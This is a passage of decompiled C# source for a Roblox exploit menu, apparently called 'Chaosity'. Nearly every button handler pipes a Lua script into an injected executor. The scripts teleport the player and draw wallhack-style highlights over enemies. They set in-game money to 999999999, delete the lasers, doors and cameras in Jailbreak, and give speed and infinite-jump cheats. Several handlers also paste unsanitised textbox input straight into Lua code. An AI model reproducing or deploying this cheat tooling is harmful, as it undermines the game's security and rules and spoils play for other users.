      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=150179182' pe.VelocitySpread = 50");
    }

    private void flatButton100_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=231866238' pe.VelocitySpread = 50");
    }

    private void flatButton98_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=121011881' pe.VelocitySpread = 50");
    }

    private void flatButton101_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=430070470' harambe.TextureId = 'http://www.roblox.com/asset/?id=430070478' harambe.Scale = Vector3.new(.9,.9,.9) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton102_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=823916834' harambe.TextureId = 'http://www.roblox.com/asset/?id=823916845' harambe.Scale = Vector3.new(.1,.1,.1) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton103_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=431021190' harambe.TextureId = 'http://www.roblox.com/asset/?id=431021197' harambe.Scale = Vector3.new(.1,.1,.1) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void richTextBox3_TextChanged(object sender, EventArgs e)
    {
    }

    private void flatButton104_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=75076725' pe.VelocitySpread = 50");
    }

    private void flatButton105_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=205751358' pe.VelocitySpread = 50");
    }

    private void flatButton106_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=391827915' pe.VelocitySpread = 50");
    }

    private void flatButton107_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=330779576' pe.VelocitySpread = 50");
    }

    private void flatButton108_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=359293220' pe.VelocitySpread = 50");
    }

    private void pictureBox1_Click(object sender, EventArgs e)
    {
    }

    private void flatButton109_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=1867402910' pe.VelocitySpread = 50");
    }

    private void tabPage1_Click(object sender, EventArgs e)
    {
    }

    private void formSkin1_Click(object sender, EventArgs e)
    {
    }

    private void flatButton111_Click(object sender, EventArgs e)
    {
    }

    private void flatButton115_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=430090810' harambe.TextureId = 'http://www.roblox.com/asset/?id=430090814' harambe.Scale = Vector3.new(.1,.1,.1) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton116_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=576505925' harambe.TextureId = 'http://www.roblox.com/asset/?id=576505930' harambe.Scale = Vector3.new(.2,.2,.2) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton114_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=733638157' harambe.TextureId = 'http://www.roblox.com/asset/?id=733638162' harambe.Scale = Vector3.new(.1,.1,.1) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton113_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=553782681' harambe.TextureId = 'http://www.roblox.com/asset/?id=553782697' harambe.Scale = Vector3.new(.2,.2,.2) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton112_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=465994528' harambe.TextureId = 'http://www.roblox.com/asset/?id=465994531' harambe.Scale = Vector3.new(.1,.1,.1) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton120_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1078.45, 153.904, 1176.52) + Vector3.new(1,0,0) end");
    }

    private void flatButton121_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1063.02, 117.562, 1218.757) + Vector3.new(1,0,0) end");
    }

    private void flatButton122_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1132.674, 100.412, 1230.48) + Vector3.new(1,0,0) end");
    }

    private void flatButton123_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game:GetService('Workspace').Lasers:ClearAllChildren()");
    }

    private void flatButton124_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("Sorry Something went wrong in the script", "", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk);
    }

    private void flatButton129_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=1867402910' pe.VelocitySpread = 50");
    }

    private void flatButton127_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=1867402910' pe.VelocitySpread = 50");
    }

    private void flatButton126_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=711674643' pe.VelocitySpread = 50");
    }

    private void flatButton125_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=45130554' pe.VelocitySpread = 50");
    }

    private void flatButton128_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=377028781' pe.VelocitySpread = 50");
    }

    private void flatButton119_Click(object sender, EventArgs e)
    {
    }

    private void flatButton131_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=45130554' pe.VelocitySpread = 1");
    }

    private void flatButton130_Click(object sender, EventArgs e)
    {
      string text = this.richTextBox2.Text;
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(744.981506, 38.1523933, 1132.73462) + Vector3.new(1,0,0) end");
    }

    private void flatButton131_Click_1(object sender, EventArgs e)
    {
      string text = this.richTextBox2.Text;
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1100.4469, 17.7500038, -1493.18286) + Vector3.new(1,0,0) end");
    }

    private void flatButton132_Click(object sender, EventArgs e)
    {
      string text = this.richTextBox2.Text;
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1176.4231, 59.7911148, -1572.6908) + Vector3.new(1,0,0) end");
    }

    private void flatButton140_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1636.31, 620, 1025.28) + Vector3.new(1,0,0) end");
    }

    private void flatButton138_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1038.67, -1.10364, -174.827) + Vector3.new(1,0,0) end");
    }

    private void flatButton139_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1781.58, -8.89979, -2414.74) + Vector3.new(1,0,0) end");
    }

    private void flatButton137_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(902.025, 56.7858, 1354.81) + Vector3.new(1,0,0) end");
    }

    private void flatButton144_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(319.801, 38.7997, 1924.53) + Vector3.new(1,0,0) end");
    }

    private void flatButton141_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1064.97, 128.601, -1051.24) + Vector3.new(1,0,0) end");
    }

    private void flatButton142_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1365.31, 292.401, 991.726) + Vector3.new(1,0,0) end");
    }

    private void flatButton143_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1667.97, 346.602, 1477.89) + Vector3.new(1,0,0) end");
    }

    private void flatButton145_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1064.97, 128.601, -1051.24) + Vector3.new(1,0,0) end");
    }

    private void flatButton146_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(265, 3, 57) + Vector3.new(1,0,0) end");
    }

    private void flatButton147_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(260, 8, -2542) + Vector3.new(1,0,0) end");
    }

    private void flatButton148_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1244, 62, 2306) + Vector3.new(1,0,0) end");
    }

    private void flatButton149_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(5207, -166, 719) + Vector3.new(1,0,0) end");
    }

    private void flatButton150_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(155, 3, 74) + Vector3.new(1,0,0) end");
    }

    private void flatButton151_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(113, 11, -977) + Vector3.new(1,0,0) end");
    }

    private void flatButton152_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(113, 11, -977) + Vector3.new(1,0,0) end");
    }

    private void flatButton157_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(12.12, -6.66, 494.34) + Vector3.new(1,0,0) end");
    }

    private void flatButton158_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-22.89, -14.58, 15.93) + Vector3.new(1,0,0) end");
    }

    private void flatButton159_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(49.03, -13.31, 52.25) + Vector3.new(1,0,0) end");
    }

    private void flatButton160_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(16.76, -13.31, 42.17) + Vector3.new(1,0,0) end");
    }

    private void flatButton161_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(12.18, -15, 156.14) + Vector3.new(1,0,0) end");
    }

    private void flatButton152_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(85.48, -13.18, 145.52) + Vector3.new(1,0,0) end");
    }

    private void flatButton153_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-26.14, 192.5, 0.002) + Vector3.new(1,0,0) end");
    }

    private void flatButton154_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-137.82, 176.77, -23.06) + Vector3.new(1,0,0) end");
    }

    private void flatButton155_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-90.1, 226.59, -19.32) + Vector3.new(1,0,0) end");
    }

    private void flatButton156_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(447.62, 2.52, 90.03) + Vector3.new(1,0,0) end");
    }

    private void flatButton162_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(464.09, 69.91, -32.49) + Vector3.new(1,0,0) end");
    }

    private void flatButton163_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(457.44, 110.23, 200.96) + Vector3.new(1,0,0) end");
    }

    private void flatButton164_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(632.16, 133.68, 211.06) + Vector3.new(1,0,0) end");
    }

    private void flatButton165_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(29.47, -15, 66.84) + Vector3.new(1,0,0) end");
    }

    private void flatButton166_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(85.48, -13.18, 145.52) + Vector3.new(1,0,0) end");
    }

    private void flatButton168_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("wait(0.5)\nplrs = nil\nfor _,p in pairs(game:GetChildren()) do\nif p.ClassName == (\"Players\") then\nplrs = p\nend\nend\nwhile true do\nwait(0.1)\nfor _, v in pairs(plrs:GetChildren()) do\nif v.TeamColor ~= plrs.LocalPlayer.TeamColor and not v.Character.Head:FindFirstChild(\"BillboardGui\") then --   ~=\ni = Instance.new(\"BillboardGui\",v.Character.Head)\ni.Active = true\ni.AlwaysOnTop = true\ni.Size = UDim2.new(1,0,1,0)\nh = Instance.new(\"Frame\",i)\nh.Size = UDim2.new(2,0,1,0)\nh.AnchorPoint = Vector2.new(0.25, 0)\nh.BackgroundColor3 = Color3.new(1,0,0)\nh.BorderSizePixel = 0\nh.BackgroundTransparency = 0.4\nend\nend\nend");
    }

    private void flatButton169_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("while wait(0.3) do\nfor _, p in pairs(game:GetChildren()) do\nif p.ClassName == (\"Players\") then\nplr = p.LocalPlayer\nteam = plr.TeamColor\nfor _, v in pairs(p:GetChildren()) do\nif v.Name ~= plr.Name and v.TeamColor ~= team then\nfor _, l in pairs(v.Character.Head:GetChildren()) do\nif l.Name == (\"OverRemove\") then\nl:Destroy()\nend\nend\ni = Instance.new(\"BillboardGui\",v.Character.Head)\ni.Name = (\"OverRemove\")\nf = Instance.new(\"Frame\",i)\ni.Active = true\ni.AlwaysOnTop = true\ni.Size = UDim2.new(1,0,1,0)\ni.ExtentsOffset = Vector3.new(0,3.5,0)\nf.Size = UDim2.new(1,0,1,0)\nf.BorderSizePixel = 0\nf.BackgroundColor3 = Color3.new(1,0,0)\nelseif v.TeamColor == team then \nfor _, l in pairs(v.Character.Head:GetChildren()) do\nif l.Name == (\"OverRemove\") then\nl:Destroy()\nend\nend\nend\nend\nend\nend\nend");
    }

    private void flatButton170_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local Move = game.Workspace.Map local ReplicatedStorage = game:GetService('ReplicatedStorage') local Players = game:GetService('Players') local mouse = Players.LocalPlayer:GetMouse() local a = false mouse.KeyDown:Connect(function(key) if key == 'e' then if a == false then Move.Parent = ReplicatedStorage Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true a = true elseif a == true then Move.Parent = game.Workspace Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false a = false end end end)");
    }

    private void flatButton172_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("while wait(2) do game:GetService('Workspace').TouchTrigger.Donut.Position = game:GetService('Players').LocalPlayer.Character.Head.Position end");
    }

    private void flatButton173_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("press (G) to activate the path ");
      NamedPipes.LuaPipe("local player = game:GetService('Players').LocalPlayer local mouse = player:GetMouse() mouse.KeyDown:connect(function(key) if key:lower() == 'g' or key:upper() == 'G' then for i = 1,6 do wait(0.085) x = Instance.new('Part',game:GetService('Workspace')) x.Size = Vector3.new(10,0.2,10) x.TopSurface = 'Smooth' x.Anchored = true x.BrickColor = BrickColor.random()  x.CFrame = CFrame.new(player.Character.UpperTorso.Position) + Vector3.new(0,-3,0) game.Debris:AddItem(x, 3) end end end)");
    }

    private void flatButton174_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Workspace.Buildings:Destroy()");
    }

    private void flatButton175_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Workspace.Trees:Destroy()");
    }

    private void flatButton176_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Workspace.Cells:Destroy()");
    }

    private void flatButton177_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Workspace.Apartments:Destroy()");
    }

    private void flatButton184_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i,v in pairs(game:GetService('Workspace').Wall:GetChildren()) do     v.CanCollide = false end");
    }

    private void flatButton183_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game:GetService('Players').Name = 'Players' game.Players.LocalPlayer.leaderstats.Money.Value = 999999999");
    }

    private void flatButton182_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game:GetService('Players').Name = 'Players' game.Players.LocalPlayer.leaderstats.Money.Value = 1000000");
    }

    private void flatButton181_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("while wait(0.3) do\nfor _, p in pairs(game:GetChildren()) do\nif p.ClassName == (\"Players\") then\nplr = p.LocalPlayer\nteam = plr.TeamColor\nfor _, v in pairs(p:GetChildren()) do\nif v.Name ~= plr.Name and v.TeamColor ~= team then\nfor _, l in pairs(v.Character.Head:GetChildren()) do\nif l.Name == (\"OverRemove\") then\nl:Destroy()\nend\nend\ni = Instance.new(\"BillboardGui\",v.Character.Head)\ni.Name = (\"OverRemove\")\nf = Instance.new(\"Frame\",i)\ni.Active = true\ni.AlwaysOnTop = true\ni.Size = UDim2.new(1,0,1,0)\ni.ExtentsOffset = Vector3.new(0,3.5,0)\nf.Size = UDim2.new(1,0,1,0)\nf.BorderSizePixel = 0\nf.BackgroundColor3 = Color3.new(1,0,0)\nelseif v.TeamColor == team then \nfor _, l in pairs(v.Character.Head:GetChildren()) do\nif l.Name == (\"OverRemove\") then\nl:Destroy()\nend\nend\nend\nend\nend\nend\nend");
    }

    private void flatButton180_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("while wait(0.3) do\nfor _, p in pairs(game:GetChildren()) do\nif p.ClassName == (\"Players\") then\nplr = p.LocalPlayer\nteam = plr.TeamColor\nfor _, v in pairs(p:GetChildren()) do\nif v.Name ~= plr.Name and v.TeamColor ~= team then\nfor _, l in pairs(v.Character.Head:GetChildren()) do\nif l.Name == (\"OverRemove\") then\nl:Destroy()\nend\nend\ni = Instance.new(\"BillboardGui\",v.Character.Head)\ni.Name = (\"OverRemove\")\nf = Instance.new(\"Frame\",i)\ni.Active = true\ni.AlwaysOnTop = true\ni.Size = UDim2.new(1,0,1,0)\ni.ExtentsOffset = Vector3.new(0,3.5,0)\nf.Size = UDim2.new(1,0,1,0)\nf.BorderSizePixel = 0\nf.BackgroundColor3 = Color3.new(1,0,0)\nelseif v.TeamColor == team then \nfor _, l in pairs(v.Character.Head:GetChildren()) do\nif l.Name == (\"OverRemove\") then\nl:Destroy()\nend\nend\nend\nend\nend\nend\nend");
    }

    private void flatButton179_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("function GetFrom(model) return game:GetService'Workspace'[tostring(model)]:GetChildren()[1].Extra:FindFirstChild'Sign'.Decal; end local bank = GetFrom'Banks' local jewelry = GetFrom'Jewelrys' bank.Changed:connect(function(prop) if prop == 'Transparency' then if bank.Transparency ~= 0 then print('Bank is open')end end end) jewelry.Changed:connect(function(prop)if prop == 'Transparency' then if jewelry.Transparency ~= 0 then print('Jewelry is open') end end end) print('Stores Ready To Rob: (If nothing shows, nothing is ready)') if GetFrom'Banks'.Transparency ~= 0 then print('Bank is open') end if GetFrom'Banks'.Transparency ~= 0 then print('Jewelry is open') end");
    }

    private void flatButton178_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("workspace.Gravity = 20");
    }

    private void flatButton185_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("workspace.Gravity = 196");
    }

    private void flatButton171_Click(object sender, EventArgs e)
    {
    }

    private void flatButton188_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i,v in pairs(game:GetService('Workspace').Buildings:GetChildren()) do v.CanCollide = false end");
    }

    private void flatButton189_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game:GetService('Players').LocalPlayer.Character.Humanoid.Name = 'Humanoida' game:GetService('Players').LocalPlayer.Character.Humanoida.WalkSpeed = 150");
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=1389215359' pe.VelocitySpread = 5");
    }

    private void flatButton192_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("boy = game:GetService('Workspace') nah = boy:FindFirstChild('Museum') nah.CaseLasers:Destroy()");
    }

    private void flatButton193_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i,v in pairs(game.Workspace.Banks:GetChildren()) do v.Name='Bank' end game:GetService('Workspace').Banks.Bank.Lasers:Destroy()");
    }

    private void flatButton194_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local hit = game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,0,-3)\na = Instance.new('Part', workspace)\na.Anchored = true\na.Position = game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,0,-3)\na.CanCollide = false\nfor i, v in pairs(game:GetService('Workspace').Givers:GetChildren()) do\nif v.Name == 'Station' then\nfor a, b in pairs(v:GetChildren()) do\nif b:IsA('StringValue') then\nif b.Value == 'Shotgun' then\nv.CFrame = CFrame.new(hit)\nend\nend\nend\nend\nend");
    }

    private void flatButton195_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local InfiniteJumpEnabled = true\ngame:GetService('UserInputService').JumpRequest:connect(function()\nif InfiniteJumpEnabled then\ngame:GetService'Players'.LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState('Jumping')\nend\nend)");
    }

    private void flatButton196_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("Chaosity.. Is looking for a V.I.P server!", "Almost Ready..!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      Process.Start("https://web.roblox.com/games/606849621/Jailbreak?privateServerLinkCode=I0YepFWu4KfG8sRDAOzl2Z2QNQSLludx");
    }

    private void flatClose1_Click(object sender, EventArgs e)
    {
      this.Hide();
      new Chaosity().Show();
    }

    private void flatButton197_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("boy = game:GetService('Workspace') nah = boy:FindFirstChild('Museum') nah.Puzzle2Door:Destroy() nah.Puzzle1Door:Destroy()");
    }

    private void flatButton203_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("boy = game:GetService('Workspace') nah = boy:FindFirstChild('Museum') nah.Doors:Destroy()");
    }

    private void flatButton202_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i,v in pairs(game.Workspace.Jewelrys:GetChildren()) do v.Name='Jewelry'  end game:GetService('Workspace').Jewelrys.Jewelry.Cameras:Destroy();");
    }

    private void flatButton201_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i,v in pairs(game.Workspace.Banks:GetChildren()) do v.Name='Bank' end game:GetService('Workspace').Banks.Bank.Door:Destroy()");
    }

    private void flatButton204_Click(object sender, EventArgs e)
    {
